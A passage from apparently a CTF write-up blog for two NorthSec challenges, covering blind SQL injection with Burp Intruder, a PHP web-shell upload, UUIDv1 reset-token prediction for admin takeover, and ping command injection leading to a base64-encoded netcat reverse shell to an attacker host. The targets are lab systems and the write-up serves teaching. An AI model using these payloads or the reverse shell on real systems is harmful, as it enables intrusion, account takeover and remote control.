<code>SELECT</code> keyword. This will add an arbitrary <code>m</code> letter to every result.  </li> <li>You are free to use another letter obviously</li> <li><code>%2</code> : You have to encode the <code>+</code> to avoid errors</li> <li><code>SUBSTRING((CAST((SELECT'm'%2name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='m'</code> : This part is checking if the first letter of the first database is <code>m</code></li> <li><code>AND 'uNDi'='uNDi</code> : This is part of the initial SQL injection identified by <code>sqlmap</code></li> </ul> <p>To confirm that this request is working we did the following <code>POST</code> requests:</p> <p>On this case we tested if the first letter was <code>m</code>, which is always true since we add an arbitrary <code>m</code> at the beginning:</p> <pre><code>username=admin' AND SUBSTRING((CAST((SELECT'm'+name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='m' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>We got the following answer, letting us that the username (<code>admin</code>) is the good one, confirming that our request worked:</p> <pre><code>&lt;div class=\"alert\"&gt;Invalid credentials.&lt;/div&gt;&lt;br&gt;  &lt;div class=\"form-input\"&gt;\n</code></pre> <p>Here, we tested if the first letter was <code>a</code>, which is false:</p> <pre><code>username=admin' AND SUBSTRING((CAST((SELECT'm'+name FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='a' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>We got the following answer, letting us now that the username (<code>admin</code>) is not the good one, confirming that our request worked:</p> <pre><code>&lt;div class=\"alert\"&gt;Invalid username.&lt;/div&gt;&lt;br&gt;  &lt;div class=\"form-input\"&gt;\n</code></pre>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#lets-automate","title":"Let's automate","text":"<p>Now that we are able to request the first letter of the database bypassing the regex, we choose to automate the process using the <code>Burp Intruder</code>.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#databases","title":"Databases","text":"<p>The first step is to find the name of the databases. At this point, we had to iterate through two points, the index letter we are trying to find, represented by <code>\u00a71\u00a7</code>, and the letter we are testing, represented by <code>\u00a7m\u00a7</code>:</p> <pre><code>POST / HTTP/1.1\nHost: photographic-memory.ctf\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 191\nOrigin: http://photographic-memory.ctf\nConnection: close\nReferer: http://photographic-memory.ctf/\nCookie: PHPSESSID=k2ip0nk80scvaubpv8u7a54bjg\nUpgrade-Insecure-Requests: 1\n\nusername=admin' AND SUBSTRING((CAST((SELECT'm'%2bname FROM master..sysdatabases ORDER BY name OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),\u00a71\u00a7,1)='\u00a7m\u00a7' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>For OFFSET at <code>0</code> we got the following results:</p> <pre><code>| 0   |   |   | 200 | false | false | 1782 | 1 |  |\n|-----|---|---|-----|-------|-------|------|---|--|\n| 601 | 1 | m | 200 | false | false | 1782 | 1 |  |\n| 602 | 2 | m | 200 | false | false | 1782 | 1 |  |\n| 3   | 3 | a | 200 | false | false | 1782 | 1 |  |\n| 904 | 4 | s | 200 | false | false | 1782 | 1 |  |\n| 955 | 5 | t | 200 | false | false | 1782 | 1 |  |\n| 206 | 6 | e | 200 | false | false | 1782 | 1 |  |\n| 857 | 7 | r | 200 | false | false | 1782 | 1 |  |\n</code></pre> <p>Which gave us the name <code>mmaster</code> where we can remove the first arbitrary <code>m</code> we add. After running four (4) times the intruder, we got the following databases names:</p> <pre><code>0 : master\n1 : model\n2 : msdb\n3 : photographic_memory\n4 : tempdb\n</code></pre> <p>Note : I just realized that we could also add an iterator <code>\u00a7</code> on the <code>OFFSET</code> to run the intruder only once ...</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#tables","title":"Tables","text":"<p>Now that we found the databases, we have to run the same kind of exercise to identify the tables. We choose to iterate on the <code>photographic_memory</code> which is probably the database of the current application.</p> <p>To do that we use almost the same request but we iterate on <code>photographic_memory..sysobjects</code> instead of <code>master..sysdatabases</code>:</p> <pre><code>POST / HTTP/1.1\nHost: photographic-memory.ctf\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 211\nOrigin: http://photographic-memory.ctf\nConnection: close\nReferer: http://photographic-memory.ctf/\nCookie: PHPSESSID=k2ip0nk80scvaubpv8u7a54bjg\nUpgrade-Insecure-Requests: 1\n\nusername=admin' AND SUBSTRING((CAST((SELECT'm'%2bname FROM photographic_memory..sysobjects WHERE xtype = 'U' ORDER BY name OFFSET 1 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),\u00a71\u00a7,1)='\u00a7m\u00a7' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>After running two (2) times the intruder we got the following databases names:</p> <pre><code>0 : file_logs\n1 : users\n</code></pre>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#data","title":"Data","text":"<p>Now that we found the table, we have to get the data. We guessed that there would be a <code>username</code> column:</p> <pre><code>username=admin' AND SUBSTRING((CAST((SELECT'm'%2busername FROM users ORDER BY username OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),1,1)='m' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>Which confirmed that there is only one user named <code>admin</code>:</p> <pre><code>0 : admin\n</code></pre> <p>Then we tried multiple other columns name like <code>password</code> - <code>pwd</code> and finally <code>passwd</code> to find the password of the <code>admin</code> user:</p> <pre><code>POST / HTTP/1.1\nHost: photographic-memory.ctf\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 211\nOrigin: http://photographic-memory.ctf\nConnection: close\nReferer: http://photographic-memory.ctf/\nCookie: PHPSESSID=k2ip0nk80scvaubpv8u7a54bjg\nUpgrade-Insecure-Requests: 1\n\nusername=admin' AND SUBSTRING((CAST((SELECT'm'%2bpasswd FROM users ORDER BY username OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),\u00a71\u00a7,1)='\u00a7m\u00a7' AND 'uNDi'='uNDi&amp;passwd=admin\n</code></pre> <p>Allowing us to find the first flag:</p> <pre><code>| 4    | 4  | a | 200 | false | false | 1773 | 1 |  |\n|------|----|---|-----|-------|-------|------|---|--|\n| 10   | 10 | a | 200 | false | false | 1774 | 1 |  |\n| 125  | 35 | b | 200 | false | false | 1774 | 1 |  |\n| 120  | 30 | b | 200 | false | false | 1774 | 1 |  |\n| 207  | 27 | c | 200 | false | false | 1774 | 1 |  |\n| 278  | 8  | d | 200 | false | false | 1773 | 1 |  |\n| 282  | 12 | d | 200 | false | false | 1774 | 1 |  |\n| 299  | 29 | d | 200 | false | false | 1774 | 1 |  |\n| 289  | 19 | d | 200 | false | false | 1774 | 1 |  |\n| 306  | 36 | d | 200 | false | false | 1774 | 1 |  |\n| 369  | 9  | e | 200 | false | false | 1773 | 1 |  |\n| 376  | 16 | e | 200 | false | false | 1774 | 1 |  |\n| 452  | 2  | f | 200 | false | false | 1773 | 1 |  |\n| 472  | 22 | f | 200 | false | false | 1774 | 1 |  |\n| 545  | 5  | g | 200 | false | false | 1773 | 1 |  |\n| 993  | 3  | l | 200 | false | false | 1773 | 1 |  |\n| 1081 | 1  | m | 200 | false | false | 1773 | 1 |  |\n| 2363 | 23 | 0 | 200 | false | false | 1774 | 1 |  |\n| 2454 | 24 | 1 | 200 | false | false | 1774 | 1 |  |\n| 2443 | 13 | 1 | 200 | false | false | 1774 | 1 |  |\n| 2464 | 34 | 1 | 200 | false | false | 1774 | 1 |  |\n| 2535 | 15 | 2 | 200 | false | false | 1774 | 1 |  |\n| 2540 | 20 | 2 | 200 | false | false | 1774 | 1 |  |\n| 2548 | 28 | 2 | 200 | false | false | 1774 | 1 |  |\n| 2627 | 17 | 3 | 200 | false | false | 1774 | 1 |  |\n| 2631 | 21 | 3 | 200 | false | false | 1774 | 1 |  |\n| 2801 | 11 | 5 | 200 | false | false | 1774 | 1 |  |\n| 2827 | 37 | 5 | 200 | false | false | 1774 | 1 |  |\n| 2887 | 7  | 6 | 200 | false | false | 1773 | 1 |  |\n| 2894 | 14 | 6 | 200 | false | false | 1774 | 1 |  |\n| 2898 | 18 | 6 | 200 | false | false | 1774 | 1 |  |\n| 2911 | 31 | 6 | 200 | false | false | 1774 | 1 |  |\n| 2918 | 38 | 6 | 200 | false | false | 1774 | 1 |  |\n| 2996 | 26 | 7 | 200 | false | false | 1774 | 1 |  |\n| 3003 | 33 | 7 | 200 | false | false | 1774 | 1 |  |\n| 3182 | 32 | 9 | 200 | false | false | 1774 | 1 |  |\n| 3175 | 25 | 9 | 200 | false | false | 1774 | 1 |  |\n| 3336 | 6  | - | 200 | false | false | 1773 | 1 |  |\n</code></pre> <p>Following reorganization we got <code>flag-6dea5d162e36d23f0197c2db6971bd56</code>.</p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#authentication","title":"Authentication","text":"<p>Now that we have the first flag we tried to use it as a password since it was stored in the <code>passwd</code> field of the database.</p> <p>The first shot gave us an error then we realized that we had to put it in capital letters to authenticate as <code>admin</code>:</p> <p></p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#file-upload","title":"File upload","text":"<p>Once authenticated an upload feature is available. If you try to submit the form without any file, you get the following message:</p> <p></p>"},{"location":"write-up/NSEC24_Photographic-Memory-System/#remote-code-execution","title":"Remote Code Execution","text":"<p>We decided to upload directly a very tiny <code>PHP</code> reverse shell:</p> <pre><code>POST /dashboard.php HTTP/1.1\nHost: photographic-memory.ctf\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------62884936718515663351035206868\nContent-Length: 250\nOrigin: http://photographic-memory.ctf\nConnection: close\nReferer: http://photographic-memory.ctf/dashboard.php\nCookie: PHPSESSID=k2ip0nk80scvaubpv8u7a54bjg\nUpgrade-Insecure-Requests: 1\n\n-----------------------------62884936718515663351035206868\nContent-Disposition: form-data; name=\"photo_memory\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n&lt;?=`$_GET[1]`?&gt;\n\n-----------------------------62884936718515663351035206868--\n</code></pre> <p>Giving us remote code execution on the server http://photographic-memory.ctf/photo-memory-uploaded/admin/shell.php?1=id:</p> <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data) \n</code></pre> <p>After a very quick recon we identified that there was a <code>flag</code> file at the root (<code>/</code>) of the file system:</p> <pre><code>GET /photo-memory-uploaded/admin/shell.php?1=cat+/flag HTTP/1.1\nHost: photographic-memory.ctf\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=k2ip0nk80scvaubpv8u7a54bjg\nUpgrade-Insecure-Requests: 1\n\n\nHTTP/1.1 200 OK\nDate: Sun, 19 May 2024 17:06:21 GMT\nServer: Apache/2.4.52 (Ubuntu)\nContent-Length: 44\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nFLAG-5e2338188e4ab1850dd5bf94c32c33c5 (2/2)\n</code></pre>"},{"location":"write-up/NSEC25_Fuel-Management-System/","title":"NSEC25 : Fuel Management System","text":"<p>During the NSEC25 CTF I had the opportunity to solve the following challenge with the help of my colleague Ashiahanim Ayassor. I will detail all the steps of this challenge in this blog post.</p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#intro","title":"Intro","text":"<p>The following information was given during the CTF:</p> <p></p> <p>In summary we got this information:</p> <ul> <li>URL: https://dashboard.fms.ctf/account/change-password?token=14e355e1-f216-11ef-b19a-d0c637f44704</li> <li>User account: <code>demo@fms.ctf</code></li> </ul>"},{"location":"write-up/NSEC25_Fuel-Management-System/#recon","title":"Recon","text":"<p>Using the URL, we arrived on this web page asking us for a password:</p> <p></p> <p>We choose to set up the password as <code>test</code>:</p> <p></p> <p>And then we tried to authenticate with the <code>demo</code> user which was given previously and its new password <code>test</code>:</p> <p></p> <p>Once authenticated, we had access to this initial dashboard:</p> <p></p> <p>The devices tab gave us this information, where one device seems to be activated and the other is not:</p> <p></p> <p>If you try to activate it, you got an error. So for now we are not able to active it.</p> <p>There is also a licenses tab, where only one license is valid and two are expired:</p> <p></p> <p>The users tab informed us that there are only two accounts, and both of them are enabled:</p> <p></p> <p>And finally the documentation tab, where we found some information regarding the sensor:</p> <p></p> <p>We also found our first flag at the bottom of the page:</p> <pre><code>$ /snap/bin/askgod submit FLAG-ca16cce6ad9a7f5eac1f6c949f34f86e66fbcc07                        \nCongratulations, you score your team 1 points!\nMessage: Sometimes, you need to RTFM 1/6\n</code></pre> <p>We got a first hint on the CTF board:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#exploitation","title":"Exploitation","text":""},{"location":"write-up/NSEC25_Fuel-Management-System/#infinite-holes-of-rabbit","title":"Infinite holes of rabbit","text":"<p>We took every possible rabbit holes on this track. Multiple reasons fort that:</p> <ul> <li>We were tired</li> <li>There was (too) many possibilities</li> <li>We suck at CTF</li> </ul>"},{"location":"write-up/NSEC25_Fuel-Management-System/#1","title":"#1","text":"<p>So the first hint told us that the documentation is not complete. Since there is a Documentation tab, we focused on <code>this</code> specific documentation.</p> <p>This documentation contains a URL for the API Swagger:</p> <p></p> <p>This API contains multiple endpoints. We tried to perform some actions using it:</p> <ul> <li><code>/api/register</code></li> </ul> <p>This endpoint is taking the following parameters:</p> <pre><code>{\n  \"device_id\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\n  \"serial\": \"AAAA-BBBB-YYYY\",\n  \"machine_id\": \"99999999999999999999999999999999\",\n  \"ip\": \"&lt;ipv6-welcome-to-nsec&gt;\",\n  \"mac\": \"&lt;mac-address&gt;\"\n}\n</code></pre> <p>After some try and reading the <code>Devices</code> tab, we understood that:</p> <ul> <li><code>ip</code> is an arbitrary The IP(v6), let's say <code>9999:9999:9999:9999:9999:9999:9999:9999</code></li> <li><code>mac</code> is an arbitrary MAC address, let's say <code>00:18:55:aa:bb:cc</code></li> <li><code>machine_id</code> seems to be an arbitrary ID by sensor</li> <li><code>serial</code> is structured using</li> <li>The type of sensor, here it's <code>E4</code></li> <li>The MAC address</li> <li>A checksum based on the 2 first elements, since it's between <code>001</code> and <code>999</code> most of the time, it can be brute-forced</li> <li><code>device_id</code> is a checksum based on the <code>serial</code></li> </ul> <p>Regarding the size of the <code>device_id</code> we were not going to brute force it. We moved on.</p> <ul> <li><code>/api/licenses</code></li> </ul> <p>We had not been able to add a new license. Every modification of the license key leads us to an error. Administrator rights are required.</p> <ul> <li><code>/api/auth/reset</code></li> </ul> <p>We were able to reset the password of the <code>admin</code> account, but since we did not have access to its email it was useless.</p> <ul> <li><code>/api/metrics</code></li> </ul> <p>Administrator rights are required. We (also) moved on.</p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#2","title":"#2","text":"<p>Maybe the Documentation quoted by the first hint was speaking about the documentation of FastAPI. Maybe some calls were undocumented on the swagger.</p> <p>So we took a deep dive on the FastAPI, searching for some black magic API call. But we found nothing.</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#3","title":"#3","text":"<p>Then we thought that there was maybe a CVE on FastAPI related to the <code>X-Token</code> that we saw on some requests. Once again, we were wrong.</p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#4","title":"#4","text":"<p>If you go back to the hint, it's talking about the administrator and the fact that only an administrator can do things. So maybe we just need to be administrator after all.</p> <p>However there is no way to become administrator when we reset the password we just got this answer:</p> <pre><code>{\"detail\":\"ok\",\"timestamp\":\"2025-05-17T04:17:29.166084+00:00\"}\n</code></pre> <p>There are two ways to reset the password:</p> <ul> <li>Getting access to the administrator email address</li> <li>Finding the token generated when we performed the password reset</li> </ul> <p>Since there is no way, based on our understanding, to get access to the email address we have to dig on the token.</p> <p>The token for the <code>demo</code> account was <code>14e355e1-f216-11ef-b19a-d0c637f44704</code>. Based on our limited knowledge, it is definitely a <code>UUID</code> which stands for <code>Universally Unique Identifier</code>.</p> <p>Using the web site https://www.uuidtools.com/decode we found that this <code>UUID</code> is a version 1 <code>UUID</code>:</p> <p></p> <p>If you have a look at the screenshot, you can see that the last part of the UUID is a MAC address without the <code>:</code>.</p> <p>Wikipedia gave us a little bit more details regarding UUID v1:</p> <p>Version 1 concatenates the 48-bit MAC address of the \"node\" (that is, the computer generating the UUID), with a 60-bit timestamp, being the number of 100-nanosecond intervals since midnight 15 October 1582 Coordinated Universal Time (UTC).</p> <p>So, if we have the MAC address and the timestamp we should be able to brute force it. What a great idea. Let's do this.</p> <p>We found <code>guidtool</code> which is described as A tool to inspect and attack version 1 GUIDs:</p> <p></p> <p>The usage is pretty simple, you just have to give a timestamp and a sample UUID and the tool is giving you a list of potential UUID:</p> <pre><code>$ guidtool -t '2025-05-16 23:00:00' 14e355e1-f216-11ef-b19a-d0c637f44704 | head\nd7e4bc00-32d5-11f0-b19a-d0c637f44704\nd7e4e310-32d5-11f0-b19a-d0c637f44704\n[...]\nd7e5cd70-32d5-11f0-b19a-d0c637f44704\nd7e5f480-32d5-11f0-b19a-d0c637f44704\n</code></pre> <p>Then we used the Intrudor tab of Burp to brute force the good UUID. Sadly, it did not work at all. We tried using multiple timestamp, but we were unable to get the right UUID.</p> <p>Let's think.</p> <ul> <li>This is the timestamp that the server sent us when we reset the password: <code>YYYY-MM-DDTHH:MM:SS.MS</code></li> <li>This is the timestamp that guidtool is taking as input: <code>YYYY-MM-DD HH:NN:SS</code></li> </ul> <p>Looks like we are missing something here. We need to be more accurate. We should have read the initial message to the end:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#uuid-is-the-answer","title":"UUID is the answer","text":"<p>The tool does not give us the ability to specify the milliseconds so we have to update it. For now, it generates a lot of UUID with a variation of at least 1 second.</p> <p>Pretty much all the source code is in the <code>guidtool.py</code>, and everything we are interested in is definitely in this file.</p> <p>First, we have to update the <code>main</code> function since the <code>parser</code> does not allow us to use a timestamp with millisecond:</p> <pre><code>def main():\n[...]\n    parser.add_argument(\"-t\", \"--base-time\",\n                        help=\"The estimated time at which the UUID was generated in '%%Y-%%m-%%d %%H:%%M:%%S' format, e.g. '2021-03-17 16:42:11'\",\n                        # HERE: \"%Y-%m-%d %H:%M:%S\n                        type=lambda s: datetime.datetime.strptime(s, \"%Y-%m-%d %H:%M:%S\"))\n</code></pre> <p>Then, we have to make two modifications on the <code>genUUIDs</code> function:</p> <ol> <li>The <code>start</code> and <code>end</code> variable are calculated using a variation of 1 second. We need to remove it to be more accurate.</li> <li>Then we can remove the <code>for</code> and replace the <code>t</code> parameter of the <code>uuid1</code> function call by <code>start</code> or <code>end</code>:</li> </ol> <pre><code>def genUUIDs(sample_uuid, precision, seconds, base_time):\n[...]\n    dt_zero = datetime.datetime(1582, 10, 15)\n    base_guid_time = base_time - dt_zero\n    base_timestamp = int(base_guid_time.total_seconds() * 1e7)\n\n    # HERE: (1e7)*seconds\n    start =  int(base_timestamp - (1e7)*seconds)\n    # HERE: (1e7)*seconds\n    end =  int(base_timestamp + (1e7)*seconds)\n    for t in range(start, end, precision):\n        yield uuid1(u.node, u.clock_seq, t)\n</code></pre> <p>The final code is below:</p> <pre><code>#! /usr/bin/env python3\nimport uuid\nimport datetime\nimport sys\nimport argparse\n\ndef UUIDTime(u):\n    dt_zero = datetime.datetime(1582, 10, 15)\n    return dt_zero + datetime.timedelta(microseconds=u.time//10)\n\ndef UUIDMac(u):\n    return \":\".join(['{:02x}'.format((u.node &gt;&gt; ele) &amp; 0xff) for ele in range (0, 8*6,8)][::-1])\n\ndef uuid1(node, clock_seq, timestamp):\n\n    time_low = timestamp &amp; 0xffffffff\n    time_mid = (timestamp &gt;&gt; 32) &amp; 0xffff\n    time_hi_version = (timestamp &gt;&gt; 48) &amp; 0x0fff\n    clock_seq_low = clock_seq &amp; 0xff\n    clock_seq_hi_variant = (clock_seq &gt;&gt; 8) &amp; 0x3f\n    return uuid.UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node), version=1)\n\ndef printUUIDInfo(u):\n    try:\n        u = uuid.UUID(u)\n    except ValueError:\n        print(\"Invalid UUID\")\n        sys.exit(2)\n\n    print (\"UUID version: {}\".format(u.version))\n\n    if u.version == 1:\n        t = UUIDTime(u)\n        print(\"UUID time: {}\".format(t))\n        print(\"UUID timestamp: {}\".format(u.time))\n        print(\"UUID node: {}\".format(u.node))\n        m = UUIDMac(u)\n        print(\"UUID MAC address: {}\".format(m))\n        print(\"UUID clock sequence: {}\".format(u.clock_seq))\n\ndef genUUIDs(sample_uuid, precision, seconds, base_time):\n    u = uuid.UUID(sample_uuid)\n    if u.version != 1:\n        print(\"Only v1 GUIDs supported\")\n        sys.exit(2)\n\n    # Get timestamp of starting GUID\n    dt_zero = datetime.datetime(1582, 10, 15)\n    base_guid_time = base_time - dt_zero\n    base_timestamp = int(base_guid_time.total_seconds() * 1e7)\n\n    # 1 second = 1e7 100-nanosecond intervals\n    # NSEC25 - Update here\n    end =  int(base_timestamp)\n    start =  int(base_timestamp)\n    # NSEC25 - Update here\n    yield uuid1(u.node, u.clock_seq, start)\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-i\", \"--info\", help=\"Print UUID info an exit\", action=\"store_true\")\n\n    parser.add_argument(\"-p\", \"--precision\", type=int, default=10000, help=\"The number of 100-nanosecond intervals between each UUID (default 10000)\")\n    parser.add_argument(\"-r\", \"--range\", type=int, default=1, help=\"The number of seconds each side of the timestamp to generate UUIDs for (deafult 1)\")\n    # NSEC25 - Update here\n    parser.add_argument(\"-t\", \"--base-time\",\n                        help=\"The estimated time at which the UUID was generated in '%%Y-%%m-%%d %%H:%%M:%%S' format, e.g. '2021-03-17 16:42:11'\",\n                        type=lambda s: datetime.datetime.strptime(s, \"%Y-%m-%d %H:%M:%S.%f\"))\n\n    parser.add_argument(\"uuid\", help=\"The UUID to inspect\")\n    args = parser.parse_args()\n\n    # Validate GUID\n    try:\n        _ = uuid.UUID(args.uuid)\n    except:\n        print(\"Invalid UUID\")\n        sys.exit(1)\n\n    # Handle info printing\n    if args.info:\n        printUUIDInfo(args.uuid)\n        sys.exit(0)\n\n    # Handle generation. Some optional arguments are required in this case\n    if args.base_time is None:\n        print(\"Base time required - specify with '-t' or '--base-time'\")\n        sys.exit(1)\n\n    for u in genUUIDs(args.uuid, args.precision, args.range, args.base_time):\n        print(u)\n\n    if name == \"main\":\n    main()\n</code></pre> <p>After that, you can just rebuild the new version of the tool and ask the API to generate a new password for the <code>admin</code> user:</p> <pre><code>POST /api/auth/token HTTP/1.1\nHost: dashboard.fms.ctf\nCookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vQGZtcy5jdGYiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc0NzQ0NzQxMX0.Kg9WhHqDVcx3H7Xy5K7-fz-RDxjg78cd1Wl4CyoRf6U\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\nAccept: application/json, text/plain, */*\nContent-Type: application/json\nOrigin: https://dashboard.fms.ctf\nReferer: https://dashboard.fms.ctf/docs\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n{\"email\":\"admin@fms.ctf\"}\n</code></pre> <p>Grab the value of the <code>timestamp</code> field in the response:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx\nDate: Sat, 17 May 2025 04:17:29 GMT\nContent-Type: application/json\nContent-Length: 62\nConnection: keep-alive\n\n{\"detail\":\"ok\",\"timestamp\":\"2025-05-17T04:17:29.166084+00:00\"}\n</code></pre> <p>Then, you can use your brand new version of <code>guidtool</code> with the timestamp and the initial UUID given in the initial message:</p> <pre><code>$ guidtool -t '2025-05-17 14:32:45.201323' 14e355e1-f216-11ef-b19a-d0c637f44704\ncc429cb0-332b-11f0-b19a-d0c637f44704\n</code></pre> <p>The new version of the tool will generate only one splendid UUID that you can use to authenticate as <code>admin</code>. The URL should look like this:</p> <ul> <li>https://dashboard.fms.ctf/account/change-password?token=cc429cb0-332b-11f0-b19a-d0c637f44704</li> </ul> <p>You can set up the password of the <code>admin</code> account and authenticate as the administrator.</p> <p>Let's grab a flag and read the next hint:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#rce-on-the-sensor","title":"RCE on the sensor","text":"<p>So, there is a diagnostic console on the sensor. We have the IP(v6) address of the sensors and there is only one sensor enabled. So let's scan this one:</p> <pre><code>Nmap scan report for 9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a\nHost is up, received echo-reply ttl 59 (0.027s latency).\nScanned at 2025-05-17 17:12:54 CEST for 14s\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 59 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>The documentation of the FMS web site gave us the credentials (<code>app:sensor</code>), so we can just SSH on it:</p> <pre><code>$ ssh app@9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a                     \napp@9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a's password: \n</code></pre> <p>After few seconds of loading this beautiful user interface should appear:</p> <p></p> <p>Juste hit <code>c</code> and you got some kind of shell allowing you to make a <code>ping</code>:</p> <p></p> <p>Obviously, there is a command injection on it. After some try you will discover that, at least, <code>;</code> and <code>&amp;</code> are filtered. So we have to use <code>|</code> for example</p> <p></p> <p>And we got an RCE as the <code>app</code> user:</p> <p></p> <p>As a bonus, you can see your own request on the log:</p> <p></p> <p>Now that we have a RCE, we want to have a reverse shell, so let's make one. We choose to encode it with <code>base64</code> since there is some filtering.</p> <ul> <li>The initial reverse shell : <code>rm /tmp/ff; mkfifo /tmp/ff;cat /tmp/ff | /bin/sh -i 2&gt;&amp;1 | nc 9000:6666:6666:6666:216:3eff:feb1:8d80 8089 &gt; /tmp/ff</code></li> <li>The encoded reverse shell : <code>cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg==</code></li> <li>The final command to run on the ping shell : <code>9000:d37e:c40b:d1b5:218:55ff:fe94:ec1a | echo -n cm0gL3RtcC9mZjsgbWtmaWZvIC90bXAvZmY7Y2F0IC90bXAvZmYgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyA5MDAwOjY2NjY6NjY2Njo2NjY2OjIxNjozZWZmOmZlYjE6OGQ4MCA4MDg5ID4gL3RtcC9mZg== | base64 -d -w 0 | sh</code></li> </ul> <p>After some recognition we have been able to find the next flag on the <code>/</code> folder:</p> <pre><code>$ ls -la\ntotal 31                                               \ndrwxr-xr-x  20 root   root     25 May 15 20:43 .           \ndrwxr-xr-x  20 root   root     25 May 15 20:43 ..\nlrwxrwxrwx   1 root   root      7 Apr 22  2024 bin -&gt; usr/bin\ndrwxr-xr-x   2 root   root      2 Feb 26  2024 bin.usr-is-merged\ndrwxr-xr-x   2 root   root      2 Apr 22  2024 boot\ndrwxr-xr-x   8 root   root    480 May 16 13:31 dev\ndrwxr-xr-x  73 root   root    151 May 15 20:43 etc\n-rw-r--r--   1 root   root     46 May 15 20:43 flag\n#\n$ cat flag\nFLAG-986ded23879c8f9173492f4257d3460ddea5b878\n</code></pre> <p>One point, awesome:</p> <pre><code>$ /snap/bin/askgod submit FLAG-986ded23879c8f9173492f4257d3460ddea5b878\nCongratulations, you score your team 1 points!\nMessage: Destination Reached, look around for your next treasure 3/6\n</code></pre> <p>What about the third hint:</p> <p></p>"},{"location":"write-up/NSEC25_Fuel-Management-System/#i-want-a-new-device","title":"I want a new device","text":"<p>The RCE allows to get the following information:</p> <ul> <li>Our current folder is <code>/home/app/sensor</code></li> <li>It contains the following folders and files</li> </ul> <pre><code>init.sh\npyproject.toml\nsrc\n  console\n  console.egg-info\nuv.lock\n</code></pre> <p>The <code>src</code> folder contains the source code of the back end in multiple <code>py</code> files. The <code>client.py</code> for example</p> 